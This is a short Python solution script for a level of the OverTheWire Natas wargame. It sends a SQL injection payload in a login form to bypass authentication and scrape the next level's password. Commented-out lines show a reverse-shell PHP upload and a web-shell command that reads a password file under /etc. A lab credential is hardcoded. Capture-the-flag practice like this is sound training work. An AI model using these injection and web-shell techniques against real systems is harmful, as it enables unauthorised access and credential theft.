import requests
import re

username ='natas14'
password ='Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()

data = {"username":'please" or 1=1 #' , "password":"asdf"}
# files = {"uploadedfile" : open('revshell.php','rb')}

responce = session.post(url + '?debug=true', data=data,auth = (username, password))
# responce = session.post(url,files = files ,data=data, auth = (username, password))
# responce = session.get(url + "upload/4h5n5vipu3.php?c=cat /etc/natas_webpass/natas14", auth = (username,password))



content = responce.text

# print(session.cookies['loggedin'])
print (content)

print ("password for natas15 is = " + re.findall('Successful login! The password for natas15 is (.*)<br>',content)[0])